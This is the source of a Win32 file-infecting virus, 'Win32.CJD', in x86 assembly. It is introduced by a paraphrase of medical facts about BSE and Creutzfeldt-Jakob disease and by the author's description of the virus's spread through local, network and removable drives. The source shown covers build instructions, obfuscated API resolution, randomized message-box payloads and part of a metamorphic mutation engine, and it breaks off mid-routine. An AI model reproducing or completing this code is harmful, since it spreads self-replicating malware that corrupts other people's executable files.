;
;
;	CREUTZFELDT-JAKOB DISEASE BioCoded by Neurobasher/Germany
;	---------------------------------------------------------
;                                       
;
;
;	
;	Index:
;	------
;
;	1 - About the biological version
;	2 - Author's description
;	3 - [WIN32.CJD] source code
;
;
;
;
;	1 - About the biological version
;	--------------------------------
;
;
;---------------------------------------
;What is Bovine Spongiform Encephalopaty
;---------------------------------------
;
;BSE is a progressive, fatal neurologic disorder of cattle and is classified as one of the transmissible 
;spongiform encephalopathies, a group of diseases of animals and humans believed to be caused by abnormally
;folded proteins called prions. The disease itself is known since 1920 and is often called the 'mad cow disease'.
;BSE was first identified in 1986 in the United Kingdom (UK), where it caused a large outbreak 
;among cattle. Although the source of the BSE epizootic agent is uncertain, feeding cattle BSE-contaminated 
;meat-and-bone meal is the major contributory factor to the amplification of BSE among cattle. Since 1986, 
;BSE cases have been identified in 20 European countries, Japan, Israel, and Canada. 
;
;The appearance of the new variant of CJD in several younger than average people in Great Britain and France 
;has led to concern that BSE may be transmitted to humans through consumption of contaminated beef. Although 
;laboratory tests have shown a strong similarity between the prions causing BSE and CJD, there is no direct 
;proof to support this theory.
;
;----------------------------------
;What is Creutzfeldt-Jakob Disease?
;----------------------------------
;
;Creutzfeldt-Jakob disease (CJD) is a rare, degenerative, invariably fatal brain disorder.
;Typically, onset of symptoms occurs at about age 60.. There are three major categories of CJD: 
;sporadic CJD, hereditary CJD, and acquired CJD. There is currently no single diagnostic test for CJD.
;The first concern is to rule out treatable forms of dementia such as encephalitis or chronic meningitis.
;The only way to confirm a diagnosis of CJD is by brain biopsy or autopsy. In a brain biopsy, 
;a neurosurgeon removes a small piece of tissue from the patient's brain so that is can be examined 
;by a neurologist. Because a correct diagnosis of CJD does not help the patient, a brain biopsy 
;is discouraged unless it is need to rule out a treatable disorder. While CJD can be transmitted to 
;other people, the risk of this happening is extremely small. 
;
;There is no treatment that can cure or control CJD. Current treatment is aimed at alleviating symptoms
;and making the patient as comfortable as possible. Opiate drugs can help relieve pain, and the drugs 
;clonazepam and sodium valproate may help relieve involuntary muscle jerks. 
;
;About 90 percent of patients die within 1 year. In the early stages of disease, patients may have 
;failing memory, behavioral changes, lack of coordination and visual disturbances. As the illness progresses, 
;mental deterioration becomes pronounced and involuntary movements, blindness, weakness of extremities, 
;and coma may occur. 
;
;The leading scientific theory at this time maintains that CJD is caused by a type of protein called a prion. 
;The harmless and the infectious forms of the prion protein are nearly identical, but the infectious form 
;takes a different folded shape than the normal protein. Researchers are examining whether the transmissible 
;agent is, in fact, a prion and trying to discover factors that influence prion infectivity and how the disorder 
;damages the brain. Using rodent models of the disease and brain tissue from autopsies, they are also trying to
;identify factors that influence the susceptibility to the disease and that govern when in life the disease appears. 
;
;
;
;	2 - Authors description
;	-----------------------
;
;It is a very complex parasitic highly polymorphic Win32 virus that uses the entry-point ;obscuring technique. 
;The virus uses a metamorphic engine and permutates its code.
;The virus infects Windows executable files (Win32 PE EXE). When run 
;the virus searches for these files and randomly infects them by different infection sheme.
;The virus searches for Win32 PE executable files in the current and five levels upper 
;directories, also on the available network and removable media and in the directories if 
;their names not begin with "W", and infects them. The virus doesn't infect files if their 
;names begin with several suspicious caracters like anti*,...
;
;or if the name contains the 'V' letter, and depending on the random counter value. 
;While infecting files the virus rebuilds and encrypts its body and writes it to one of the 
;host file's sections. Then, it searches for and replaces one of the calls to the 
;"ExitProcess" function in the host's code section with the call to the viral code. 
;Several functions depends on randomness and are mutated from generation to generation also.
;
;Payload
;Depending on the system date the virus displays various messages
;There's a really small chance the virus allows multipe infections of the files.
;This files were corrupted and won't work anymore.
;
;
;	3 - Win32 source code
;	---------------------
;          bugfixed vers.
;  
;       To get first generation file use TASM 5.0r 
;       c:\tasm32 -ml -m9 -q cjdiseae.asm
;       c:\tlink32 -Tpe -c -x -aa -r cjdisease.obj,,,import32
;

.386p
.model flat
locals

.code
                ret   
.data                 
                      

AddressToFree   dd      0

extrn ExitProcess:PROC
extrn VirtualAlloc:PROC
extrn VirtualFree:PROC
extrn GetModuleHandleA:PROC
extrn GetProcAddress:PROC
extrn MessageBoxA:PROC        


PreMain         proc
                push    4
                push    1000h
                push    350000h     
                push    0
                call    VirtualAlloc
                or      eax, eax
                jz    @@Error
                mov     ebp, eax    

                mov     [AddressToFree], eax
                mov     ebx, eax
                mov     esi, offset Main
                mov     edi, eax
                mov     ecx, offset EndOfCode
                sub     ecx, offset Main
                rep     movsb         ; Copy virus

                push    __DISASM2_SECTION
                push    __DATA_SECTION
                push    __BUFFERS_SECTION
                push    __DISASM_SECTION
                push    __CODE_SECTION    
                mov     eax, offset GetProcAddress
                mov     eax, [eax+2]
                push    eax         
                mov     eax, offset GetModuleHandleA
                mov     eax, [eax+2]
                push    eax
                push    5*2 ; Bit 0=0: 'A', 1
                call    ebx             

                push    0C000h
                push    0
                push    dword ptr [AddressToFree]
                call    VirtualFree   
      @@Error:
                push    0
                jmp   @@Dropper

title: db '  [Win32.CJD] was done by <<<NEUROBASHER/GERMANY>>>   ',0
body:  db '             Creutzfeldt-Jakob Disease                ',0ah,0dh
       db ' rare, degenerative, invariably fatal brain disorder. ',0ah,0dh
       db '                    -------------                     ',0ah,0dh
       db '        [BSE] Bovine Spongiform Encephalopaty         ',0ah,0dh
       db '            well known as mad-cow-disease             ',0ah,0dh
       db '                                                      ',0ah,0dh
       db '  f i r s t   g e n e r a t i o n   e x e c u t e d . . . ',0

@@Dropper:
push 0h
push offset title
push offset body
push 0h
call MessageBoxA
push 0h
                call    ExitProcess
PreMain         endp

__CODE_SECTION          EQU     000000h
__DISASM_SECTION        EQU     100000h
__BUFFERS_SECTION       EQU     080000h
__LABEL_SECTION         EQU     __BUFFERS_SECTION + 00000h
__VARIABLE_SECTION      EQU     __BUFFERS_SECTION + 10000h
__BUFFER1_SECTION       EQU     __BUFFERS_SECTION + 20000h
__BUFFER2_SECTION       EQU     __BUFFERS_SECTION + 30000h
__VAR_MARKS_SECTION     EQU     __BUFFERS_SECTION + 40000h
__DATA_SECTION          EQU     0E0000h
__DISASM2_SECTION       EQU     200000h

NumberOfLabels          EQU     __DATA_SECTION + 0000h
NumberOfInstructions    EQU     __DATA_SECTION + 0008h
InstructionTable        EQU     __DATA_SECTION + 0010h
LabelTable              EQU     __DATA_SECTION + 0018h
FutureLabelTable        EQU     __DATA_SECTION + 0020h
PathMarksTable          EQU     __DATA_SECTION + 0028h
NumberOfLabelsPost      EQU     __DATA_SECTION + 0030h
AddressOfLastInstruction EQU    __DATA_SECTION + 0038h
VariableTable           EQU     __DATA_SECTION + 0040h
NumberOfVariables       EQU     __DATA_SECTION + 0048h
FramesTable             EQU     __DATA_SECTION + 0050h
PermutationResult       EQU     __DATA_SECTION + 0058h
JumpsTable              EQU     __DATA_SECTION + 0060h
AddressOfLastFrame      EQU     __DATA_SECTION + 0068h
PositionOfFirstInstruction EQU  __DATA_SECTION + 0070h
MODValue                EQU     __DATA_SECTION + 0078h
NumberOfJumps           EQU     __DATA_SECTION + 0080h
RndSeed1                EQU     __DATA_SECTION + 0088h
RndSeed2                EQU     __DATA_SECTION + 0090h
ExpansionResult         EQU     __DATA_SECTION + 0098h
Register8Bits           EQU     __DATA_SECTION + 00A0h
Xp_Register0            EQU     __DATA_SECTION + 00A8h
Xp_Register1            EQU     __DATA_SECTION + 00B0h
Xp_Register2            EQU     __DATA_SECTION + 00B8h
Xp_Register3            EQU     __DATA_SECTION + 00C0h
Xp_Register4            EQU     __DATA_SECTION + 00C8h
Xp_Register5            EQU     __DATA_SECTION + 00D0h
Xp_Register6            EQU     __DATA_SECTION + 00D8h
Xp_Register7            EQU     __DATA_SECTION + 00E0h
DeltaRegister           EQU     __DATA_SECTION + 00E8h
Xp_8Bits                EQU     __DATA_SECTION + 00F0h
Xp_Operation            EQU     __DATA_SECTION + 00F8h
Xp_Register             EQU     __DATA_SECTION + 0100h
Xp_Mem_Index1           EQU     __DATA_SECTION + 0108h
Xp_Mem_Index2           EQU     __DATA_SECTION + 0110h
Xp_Mem_Addition         EQU     __DATA_SECTION + 0118h
Xp_Immediate            EQU     __DATA_SECTION + 0120h
Xp_SrcRegister          EQU     __DATA_SECTION + 0128h
Xp_FlagRegOrMem         EQU     __DATA_SECTION + 0130h
Xp_RecurseLevel         EQU     __DATA_SECTION + 0138h
Xp_LEAAdditionFlag      EQU     __DATA_SECTION + 0140h
VarMarksTable           EQU     __DATA_SECTION + 0148h
_BUFFERS_SECTION        EQU     __DATA_SECTION + 0150h
_CODE_SECTION           EQU     __DATA_SECTION + 0158h
_DISASM_SECTION         EQU     __DATA_SECTION + 0160h
_LABEL_SECTION          EQU     __DATA_SECTION + 0168h
_VARIABLE_SECTION       EQU     __DATA_SECTION + 0170h
_BUFFER1_SECTION        EQU     __DATA_SECTION + 0178h
_BUFFER2_SECTION        EQU     __DATA_SECTION + 0180h
_VAR_MARKS_SECTION      EQU     __DATA_SECTION + 0188h
_DATA_SECTION           EQU     __DATA_SECTION + 0190h
_DISASM2_SECTION        EQU     __DATA_SECTION + 0198h
New_CODE_SECTION        EQU     __DATA_SECTION + 01A0h
New_DISASM_SECTION      EQU     __DATA_SECTION + 01A8h
New_BUFFERS_SECTION     EQU     __DATA_SECTION + 01B0h
; New_LABEL_SECTION       EQU     __DATA_SECTION + 01B0h
; New_VARIABLE_SECTION    EQU     __DATA_SECTION + 01B8h
; New_BUFFER1_SECTION     EQU     __DATA_SECTION + 01C0h
; New_BUFFER2_SECTION     EQU     __DATA_SECTION + 01C8h
; New_VAR_MARKS_SECTION   EQU     __DATA_SECTION + 01D0h
New_DATA_SECTION        EQU     __DATA_SECTION + 01D8h
New_DISASM2_SECTION     EQU     __DATA_SECTION + 01E0h
RVA_GetModuleHandle     EQU     __DATA_SECTION + 01E8h
RVA_GetProcAddress      EQU     __DATA_SECTION + 01F0h
FlagAorW                EQU     __DATA_SECTION + 01F8h
ReturnValue             EQU     __DATA_SECTION + 0200h
hKernel                 EQU     __DATA_SECTION + 0208h
hUser32                 EQU     __DATA_SECTION + 0210h
RVA_CreateFileA         EQU     __DATA_SECTION + 0218h
RVA_CreateFileMappingA  EQU     __DATA_SECTION + 0220h
RVA_MapViewOfFile       EQU     __DATA_SECTION + 0228h
RVA_UnmapViewOfFile     EQU     __DATA_SECTION + 0230h
RVA_GetFileSize         EQU     __DATA_SECTION + 0238h
RVA_GetFileAttributesA  EQU     __DATA_SECTION + 0240h
RVA_SetFileAttributesA  EQU     __DATA_SECTION + 0248h
RVA_SetFilePointer      EQU     __DATA_SECTION + 0250h
RVA_SetFileTime         EQU     __DATA_SECTION + 0258h
RVA_SetEndOfFile        EQU     __DATA_SECTION + 0260h
RVA_FindFirstFileA      EQU     __DATA_SECTION + 0268h
RVA_FindNextFileA       EQU     __DATA_SECTION + 0270h
RVA_FindClose           EQU     __DATA_SECTION + 0278h
RVA_CloseHandle         EQU     __DATA_SECTION + 0280h
RVA_MessageBoxA         EQU     __DATA_SECTION + 0288h
NewLabelTable           EQU     __DATA_SECTION + 0290h
Asm_ByteToSort          EQU     __DATA_SECTION + 0298h
JumpRelocationTable     EQU     __DATA_SECTION + 02A0h
NumberOfJumpRelocations EQU     __DATA_SECTION + 02A8h
Permut_LastInstruction  EQU     __DATA_SECTION + 02B0h
TranslatedDeltaRegister EQU     __DATA_SECTION + 02B8h
hFile                   EQU     __DATA_SECTION + 02C0h
FileSize                EQU     __DATA_SECTION + 02C8h
OriginalFileSize        EQU     __DATA_SECTION + 02D0h
hMapping                EQU     __DATA_SECTION + 02D8h
MappingAddress          EQU     __DATA_SECTION + 02E0h
HeaderAddress           EQU     __DATA_SECTION + 02E8h
StartOfSectionHeaders   EQU     __DATA_SECTION + 02F0h
RelocHeader             EQU     __DATA_SECTION + 02F8h
TextHeader              EQU     __DATA_SECTION + 0300h
DataHeader              EQU     __DATA_SECTION + 0308h
RVA_TextHole            EQU     __DATA_SECTION + 0310h
Phys_TextHole           EQU     __DATA_SECTION + 0318h
TextHoleSize            EQU     __DATA_SECTION + 0320h
RVA_DataHole            EQU     __DATA_SECTION + 0328h
Phys_DataHole           EQU     __DATA_SECTION + 0330h
MakingFirstHole         EQU     __DATA_SECTION + 0338h
ExitProcessAddress      EQU     __DATA_SECTION + 0340h
GetModuleHandleAddress  EQU     __DATA_SECTION + 0348h
GetProcAddressAddress   EQU     __DATA_SECTION + 0350h
VirtualAllocAddress     EQU     __DATA_SECTION + 0358h
GetModuleHandleMode     EQU     __DATA_SECTION + 0360h
VirtualPositionOfVar    EQU     __DATA_SECTION + 0368h
PhysicalPositionOfVar   EQU     __DATA_SECTION + 0370h
Kernel32Imports         EQU     __DATA_SECTION + 0378h
hFindFile               EQU     __DATA_SECTION + 0380h
Addr_FilePath           EQU     __DATA_SECTION + 0388h
FileAttributes          EQU     __DATA_SECTION + 0390h
SizeOfNewCode           EQU     __DATA_SECTION + 0398h
FindFileData            EQU     __DATA_SECTION + 03A0h
OtherBuffers            EQU     __DATA_SECTION + 03A8h
RoundedSizeOfNewCode    EQU     __DATA_SECTION + 03B0h
NewAssembledCode        EQU     __DATA_SECTION + 03B8h
NumberOfUndoActions     EQU     __DATA_SECTION + 03C0h
LastHeader              EQU     __DATA_SECTION + 03C8h
MaxSizeOfDecryptor      EQU     __DATA_SECTION + 03D0h
CreatingADecryptor      EQU     __DATA_SECTION + 03D8h
DecryptorPseudoCode     EQU     __DATA_SECTION + 03E0h
AssembledDecryptor      EQU     __DATA_SECTION + 03E8h
Decryptor_DATA_SECTION  EQU     __DATA_SECTION + 03F0h
SizeOfExpansion         EQU     __DATA_SECTION + 03F8h
SizeOfDecryptor         EQU     __DATA_SECTION + 0400h
TypeOfEncryption        EQU     __DATA_SECTION + 0408h
EncryptionKey           EQU     __DATA_SECTION + 0410h
IndexValue              EQU     __DATA_SECTION + 0418h
IndexRegister           EQU     __DATA_SECTION + 0420h
BufferRegister          EQU     __DATA_SECTION + 0428h
CounterRegister         EQU     __DATA_SECTION + 0430h
BufferValue             EQU     __DATA_SECTION + 0438h
CounterValue            EQU     __DATA_SECTION + 0440h
Poly_FirstPartOfFunction EQU    __DATA_SECTION + 0448h
Poly_SecondPartOfFunction EQU   __DATA_SECTION + 0450h
Poly_ThirdPartOfFunction EQU    __DATA_SECTION + 0458h
AdditionToBuffer        EQU     __DATA_SECTION + 0460h
Poly_Jump_ErrorInVirtualAlloc EQU __DATA_SECTION+0468h
;Index2Register          EQU     __DATA_SECTION + 0470h
Poly_LoopLabel          EQU     __DATA_SECTION + 0478h
RVA_GetSystemTime       EQU     __DATA_SECTION + 0480h
RVA_GetTickCount        EQU     __DATA_SECTION + 0488h
RVA_GetDriveTypeA       EQU     __DATA_SECTION + 0490h
RVA_GetLogicalDriveStringsA EQU __DATA_SECTION + 0498h
RVA_SetCurrentDirectoryA EQU    __DATA_SECTION + 04A0h
StartOfEncryptedData    EQU     __DATA_SECTION + 04A8h
SizeOfNewCodeP2         EQU     __DATA_SECTION + 04B0h
Poly_InitialValue       EQU     __DATA_SECTION + 04B8h
Poly_Addition           EQU     __DATA_SECTION + 04C0h
Poly_ExcessJumpInstruction EQU  __DATA_SECTION + 04C8h
DirectoryDeepness       EQU     __DATA_SECTION + 04D0h
RVA_GetSystemDefaultLCID EQU    __DATA_SECTION + 04D8h
Poly_JumpRandomExecution EQU    __DATA_SECTION + 04E0h

Main            proc
                ; EBP = Delta offset
                pop     ebx     

                pop     eax
                mov     ecx, eax
                and     eax, 1
                mov     [ebp+FlagAorW], eax
                and     ecx, 0FFFFFFFEh
                shr     ecx, 1
                mov     [ebp+DeltaRegister], ecx 

                pop     eax
                mov     eax, [eax]
                mov     [ebp+RVA_GetModuleHandle], eax
                pop     eax
                mov     eax, [eax]
                mov     [ebp+RVA_GetProcAddress], eax
                pop     eax
                and     eax, 03FFFFFh         
                mov     [ebp+_CODE_SECTION], eax
                pop     eax
                and     eax, 03FFFFFh      
                mov     [ebp+_DISASM_SECTION], eax
                pop     eax
                and     eax, 03FFFFFh         
                mov     [ebp+_BUFFERS_SECTION], eax

                mov     [ebp+_LABEL_SECTION], eax  
                add     eax, 10000h                
                mov     [ebp+_VARIABLE_SECTION], eax
                add     eax, 10000h
                mov     [ebp+_BUFFER1_SECTION], eax
                add     eax, 10000h
                mov     [ebp+_BUFFER2_SECTION], eax
                add     eax, 10000h
                mov     [ebp+_VAR_MARKS_SECTION], eax

                pop     eax
                and     eax, 03FFFFFh
                mov     [ebp+_DATA_SECTION], eax
                pop     eax
                and     eax, 03FFFFFh
                mov     [ebp+_DISASM2_SECTION], eax
                push    ebx ; Restore return value


                mov     edx, [ebp+_BUFFER1_SECTION]
                add     edx, ebp

                push    eax
                push    ecx
                push    edx  ; APICALL_BEGIN

                mov     eax, 'nrek'
                mov     [edx], eax
                mov     eax, '23le'
                mov     [edx+4], eax
                mov     eax, 'lld.'
                mov     [edx+8], eax
                xor     eax, eax
                mov     [edx+0Ch], eax  
                call    APICall_GetModuleHandle
                pop     edx
                pop     ecx
                pop     eax  

                mov     eax, [ebp+ReturnValue]
                or      eax, eax        
                jz    @@Error
                mov     [ebp+hKernel], eax

                push    eax
                push    ecx
                push    edx 
                mov     eax, 'resu'
                mov     [edx], eax
                mov     eax, 'd.23'
                mov     [edx+4], eax
                mov     eax, 'll'
                mov     [edx+8], eax 
                call    APICall_GetModuleHandle
                pop     edx
                pop     ecx
                pop     eax  

                mov     eax, [ebp+ReturnValue] 
                mov     [ebp+hUser32], eax    

                mov     edx, [ebp+_BUFFER1_SECTION]
                add     edx, ebp
                mov     edi, [ebp+hKernel]  

                mov     eax, 'aerC'
                mov     [edx], eax
                mov     eax, 'iFet'
                mov     [edx+4], eax
                mov     eax, 'Ael'
                mov     [edx+8], eax
                call    GetFunction   
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_CreateFileA], eax

                mov     eax, 'ppaM'
                mov     [edx+0Ah], eax
                mov     eax, 'Agni'
                mov     [edx+0Eh], eax
                xor     eax, eax
                mov     [edx+12h], eax
                call    GetFunction   
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_CreateFileMappingA], eax

                add     edx, 2
                mov     eax, 'VpaM'
                mov     [edx], eax
                mov     eax, 'Owei'
                mov     [edx+4], eax
                mov     eax, 'liFf'
                mov     [edx+8], eax
                mov     eax, 'e'
                mov     [edx+0Ch], eax
                call    GetFunction   
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_MapViewOfFile], eax

                sub     edx, 2
                mov     eax, 'amnU'
                mov     [edx], eax
                call    GetFunction   
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_UnmapViewOfFile], eax

                mov     eax, 'SteG'
                mov     [edx], eax
                mov     eax, 'etsy'
                mov     [edx+4], eax
                mov     eax, 'miTm'
                mov     [edx+8], eax
                mov     eax, 'e'
                mov     [edx+0Ch], eax
                call    GetFunction 
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_GetSystemTime], eax

                mov     eax, 'virD'
                mov     [edx+3], eax
                mov     eax, 'pyTe'
                mov     [edx+7], eax
                mov     eax, 'Ae'
                mov     [edx+0Bh], eax
                call    GetFunction   
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_GetDriveTypeA], eax

                mov     eax, 'igoL'
                mov     [edx+3], eax
                mov     eax, 'Dlac'
                mov     [edx+7], eax
                mov     eax, 'evir'
                mov     [edx+0Bh], eax
                mov     eax, 'irtS'
                mov     [edx+0Fh], eax
                mov     eax, 'Asgn'
                mov     [edx+13h], eax
                xor     eax, eax
                mov     [edx+17h], eax
                call    GetFunction   
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_GetLogicalDriveStringsA], eax

                mov     eax, 'tsyS'
                mov     [edx+3], eax
                mov     eax, 'eDme'
                mov     [edx+7], eax
                mov     eax, 'luaf'
                mov     [edx+0Bh], eax
                mov     eax, 'ICLt'
                mov     [edx+0Fh], eax
                mov     eax, 'D'
                mov     [edx+13h], eax
                call    GetFunction   
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_GetSystemDefaultLCID], eax

                mov     eax, 'CteS'
                mov     [edx], eax
                mov     eax, 'erru'
                mov     [edx+4], eax
                mov     eax, 'iDtn'
                mov     [edx+8], eax
                mov     eax, 'tcer'
                mov     [edx+0Ch], eax
                mov     eax, 'Ayro'
                mov     [edx+10h], eax
                xor     eax, eax
                mov     [edx+14h], eax
                call    GetFunction  
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_SetCurrentDirectoryA], eax

                mov     eax, 'FteG'
                mov     [edx], eax
                mov     eax, 'Seli'
                mov     [edx+4], eax
                mov     eax, 'ezi'
                mov     [edx+8], eax
                call    GetFunction   
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_GetFileSize], eax

                mov     eax, 'rttA'
                mov     [edx+7], eax
                mov     eax, 'tubi'
                mov     [edx+0Bh], eax
                mov     eax, 'Ase'
                mov     [edx+0Fh], eax
                call    GetFunction   
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_GetFileAttributesA], eax

                mov     eax, 'FteS'
                mov     [edx], eax
                call    GetFunction   
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_SetFileAttributesA], eax

                mov     eax, 'nioP'
                mov     [edx+7], eax
                mov     eax, 'ret'
                mov     [edx+0Bh], eax
                call    GetFunction   
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_SetFilePointer], eax

                mov     eax, 'emiT'
                mov     [edx+7], eax
                xor     eax, eax
                mov     [edx+0Bh], eax
                call    GetFunction   
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_SetFileTime], eax

                mov     eax, 'OdnE'
                mov     [edx+3], eax
                mov     eax, 'liFf'
                mov     [edx+7], eax
                mov     eax, 'e'
                mov     [edx+0Bh], eax
                call    GetFunction   
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_SetEndOfFile], eax

                mov     eax, 'dniF'
                mov     [edx], eax
                mov     eax, 'sriF'
                mov     [edx+4], eax
                mov     eax, 'liFt'
                mov     [edx+8], eax
                mov     eax, 'Ae'
                mov     [edx+0Ch], eax
                call    GetFunction   
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_FindFirstFileA], eax

                mov     eax, 'txeN'
                mov     [edx+4], eax
                mov     eax, 'eliF'
                mov     [edx+8], eax
                mov     eax, 'A'
                mov     [edx+0Ch], eax
                call    GetFunction   
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_FindNextFileA], eax

                mov     eax, 'solC'
                mov     [edx+4], eax
                mov     eax, 'e'
                mov     [edx+8], eax
                call    GetFunction   
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_FindClose], eax

                add     edx, 4
                mov     eax, 'dnaH'
                mov     [edx+5], eax
                mov     eax, 'el'
                mov     [edx+9], eax
                call    GetFunction   
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_CloseHandle], eax

                sub     edx, 4
                mov     edi, [ebp+hUser32] 
                mov     eax, 'sseM'        
                mov     [edx], eax
                mov     eax, 'Bega'
                mov     [edx+4], eax
                mov     eax, 'Axo'
                mov     [edx+8], eax
                call    GetFunction   
                mov     [ebp+RVA_MessageBoxA], eax 
                                                   


                push    eax
                push    ecx
                push    edx 

                mov     eax, [ebp+_BUFFER1_SECTION]
                add     eax, ebp
                push    eax
                call    dword ptr [ebp+RVA_GetSystemTime]

                pop     edx
                pop     ecx
                pop     eax 

                mov     ebx, [ebp+_BUFFER1_SECTION]
                add     ebx, ebp
                mov     eax, [ebx+04h]
                add     eax, [ebx+0Ch]
                mov     [ebp+RndSeed1], eax
                add     eax, [ebx+08h]
                mov     [ebp+RndSeed2], eax

                mov     eax, [ebp+RVA_MessageBoxA]
                or      eax, eax
                jz    @@NoPayload      
                                       


;; Simple, silly MessageBox with a partly metamorphic message :)

                mov     edx, [ebp+_BUFFER1_SECTION]
                add     edx, ebp
                mov     eax, [edx+2]
                and     eax, 0FFh
    @@ChoosePayload:
                call    Random
                and     eax, 3
                cmp     eax, 1
                je   @@CheckPayload
                cmp     eax, 2
                je   @@CheckPayload2
                cmp     eax, 3
                je   @@CheckPayload3
                cmp     eax, 0
                je   @@EndPayload
    @@CheckPayload:
                call    Random
                and     eax, 03Fh        
                jnz   @@EndPayload
                push    edx
                call    Random
                and     eax, 00000000h   
                add     eax, 'DJC['      ;; "[CJD"
                mov     [edx], eax       
                add     edx, 4
                call    Random
                and     eax, 20200000h
                add     eax, 'RC ]'      ;; "] CR"
                mov     [edx], eax
                add     edx, 4
                call    Random
                and     eax, 20202020h
                add     eax, 'ZTUE'      ;; "EUTZ"
                mov     [edx], eax
                add     edx, 4
                call    Random
                and     eax, 20202020h
                add     eax, 'DLEF'      ;; "FELD"
                mov     [edx], eax
                add     edx, 4
                call    Random
                and     eax, 20200020h
                add     eax, 'AJ-T'      ;; "T-JA"
                mov     [edx], eax
                add     edx, 4
                call    Random
                and     eax, 00202020h
                add     eax, ' BOK'      ;; "KOB "
                mov     [edx], eax
                add     edx, 4
                call    Random
                and     eax, 20202020h
                add     eax, 'ESID'      ;; "DISE"
                mov     [edx], eax
                add     edx, 4
                call    Random
                and     eax, 00202020h
                add     eax, ' ESA'      ;; "ASE "
                mov     [edx], eax
                call    Random
                and     eax, 2
                jnz   @@TruncatePayload
                add     edx, 4
                call    Random
                and     eax, 00000000h
                add     eax, ' )c('      ;; " (c)"
                mov     [edx], eax
                add     edx, 4
                call    Random
                and     eax, 00000000h
                add     eax, 'N yb'         ;; "by N"
                mov     [edx], eax
                add     edx, 4
                call    Random
                and     eax, 00000000h
                add     eax, 'orue'      ;; "euro"
                mov     [edx], eax
                add     edx, 4
                call    Random
                and     eax, 00000000h
                add     eax, 'hsab'      ;; "bash"
                mov     [edx], eax
                add     edx, 4
                call    Random
                and     eax, 00000000h
                add     eax, 'G/re'      ;; "er/G"
                mov     [edx], eax
                add     edx, 4
                call    Random
                and     eax, 00000000h
                add     eax, 'amre'      ;; "erma"
                mov     [edx], eax
                add     edx, 4
                call    Random
                and     eax, 00000000h
                add     eax, '  yn'      ;; "ny  "
                mov     [edx], eax
      @@TruncatePayload:
                pop     edx
                                  ; "[CJD] Creutzfeldt-Jakob Disease"
                                  ; and sometimes "by Neurobasher/Germany" 
                push    eax       ; first part with random upcases and lowcases.
                push    ecx
                push    edx

                xor     eax, eax
                push    eax
                mov     eax, edx
                push    eax
                push    eax
                xor     eax, eax
                push    eax
                call    dword ptr [ebp+RVA_MessageBoxA]

                pop     edx
                pop     ecx
                pop     eax
                jmp   @@EndPayload

   @@CheckPayload2:
                call    Random
                and     eax, 1FFh
                jnz   @@CheckPayload3
                push    edx   
                xor     eax, eax
                call    Random
                and     eax, 20202020h   
                add     eax, 'IVOB'      ;; "BOVI"
                mov     [edx], eax       
                add     edx, 4
                call    Random
                and     eax, 20002020h
                add     eax, 'S EN'      ;; "NE S"
                mov     [edx], eax
                add     edx, 4
                call    Random
                and     eax, 20202020h
                add     eax, 'GNOP'      ;; "PONG"
                mov     [edx], eax
                add     edx, 4
                call    Random
                and     eax, 20202020h
                add     eax, 'ROFI'      ;; "IFOR"
                mov     [edx], eax
                add     edx, 4
                call    Random
                and     eax, 20002020h
                add     eax, 'NE M'      ;; "M EN"
                mov     [edx], eax
                add     edx, 4
                call    Random
                and     eax, 20202020h
                add     eax, 'HPEC'      ;; "CEPH"
                mov     [edx], eax
                add     edx, 4
                call    Random
                and     eax, 20202020h
                add     eax, 'POLA'      ;; "ALOP"
                mov     [edx], eax
                add     edx, 4
                call    Random
                and     eax, 00202020h
                add     eax, ' YTA'      ;; "ATY "
                mov     [edx], eax
                pop     edx
                                      
                push    eax
                push    ecx
                push    edx
                xor     eax, eax
                push    eax
                mov     eax, edx
                push    eax
                push    eax
                xor     eax, eax
                push    eax
                call    dword ptr [ebp+RVA_MessageBoxA]
                pop     edx
                pop     ecx
                pop     eax

   @@CheckPayload3:
                call    Random
                and     eax, 1FFh    
                jnz   @@EndPayload
                push    edx       
                xor     eax, eax
                call    Random
                and     eax, 00202020h   
                add     eax, ' DAM'      ;; "MAD "
                mov     [edx], eax       
                add     edx, 4
                call    Random
                and     eax, 00202020h
                add     eax, ' WOC'      ;; "COW "
                mov     [edx], eax
                add     edx, 4
                call    Random
                and     eax, 20202020h
                add     eax, 'ESID'      ;; "DISE"
                mov     [edx], eax
                add     edx, 4
                call    Random
                and     eax, 00202020h
                add     eax, ' ESA'      ;; "ASE "
                mov     [edx], eax
                pop     edx
                push    eax
                push    ecx
                push    edx
                xor     eax, eax
                push    eax
                mov     eax, edx
                push    eax
                push    eax
                xor     eax, eax
                push    eax
                call    dword ptr [ebp+RVA_MessageBoxA]
                pop     edx
                pop     ecx
                pop     eax
   @@EndPayload:

   @@NoPayload:


                mov     esi, [ebp+_DISASM_SECTION]
                add     esi, ebp
                xor     eax, eax  
                push    esi       
      @@LoopGarbleSect_01:
                mov     ebx, eax
                add     eax, 1
                mov     ecx, eax
                add     eax, 1
                mov     edx, eax
                add     eax, 1
                push    eax
                call    Xp_GarbleRegisters 
                pop     eax
                mov     [esi], ebx
                mov     [esi+4], ecx
                mov     [esi+8], edx  
                add     esi, 0Ch
                cmp     eax, 6
                jnz   @@LoopGarbleSect_01 

                pop     esi
                push    esi
                mov     ecx, 2   
      @@LoopGarbleSect_02:
                push    ecx
                mov     ebx, [esi]      
                mov     ecx, [esi+08h]  
                mov     edx, [esi+10h]
                call    Xp_GarbleRegisters
                mov     [esi], ebx
                mov     [esi+08h], ecx
                mov     [esi+10h], edx  
                pop     ecx
                add     esi, 4
                sub     ecx, 1
                or      ecx, ecx
                jnz   @@LoopGarbleSect_02 
                pop     esi

                mov     ecx, 6
                xor     edx, edx   
      @@LoopGarbleSect_03:
